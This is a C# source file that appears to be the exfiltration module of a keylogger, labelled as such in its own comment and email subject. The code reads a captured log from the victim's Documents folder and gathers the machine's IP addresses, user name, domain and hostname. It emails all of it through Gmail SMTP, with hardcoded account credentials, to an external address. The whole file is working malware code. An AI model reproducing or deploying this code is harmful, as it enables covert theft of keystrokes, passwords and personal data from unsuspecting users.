#region - Using

using System;
using System.IO;
using System.Net;
using System.Net.Mail;

#endregion - Using

namespace Helper
{
    public class MailHelper
    {
        public static void SendNewMessage(string path)
        {
            //send the contents of the text file to an external email address.
            String folderName = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            string filePath = folderName + path;
            String logContents = File.ReadAllText(filePath);
            string emailBody = "";

            //create an email message
            DateTime now = DateTime.Now;
            string subject = "Message from keylogger";
            var host = Dns.GetHostEntry(Dns.GetHostName());

            foreach (var address in host.AddressList)
            {
                emailBody += "Address: " + address;
            }
            emailBody += "\n User: " + Environment.UserDomainName + " \\ " + Environment.UserName;
            emailBody += "\nhost: " + host;
            emailBody += "\ntime: " + now.ToString() + "\n";
            emailBody += logContents;

            SmtpClient client = new SmtpClient("smtp.gmail.com", 587);
            MailMessage mailMessage = new MailMessage();

            mailMessage.From = new MailAddress("keylogacco@gmail.com");
            mailMessage.To.Add("mrtcnrdmii@gmail.com");
            mailMessage.Subject = subject;
            client.UseDefaultCredentials = false;
            client.EnableSsl = true;
            client.Credentials = new System.Net.NetworkCredential("keylogacco@gmail.com", "keylog123");
            mailMessage.Body = emailBody;

            client.Send(mailMessage);
        }
    }
}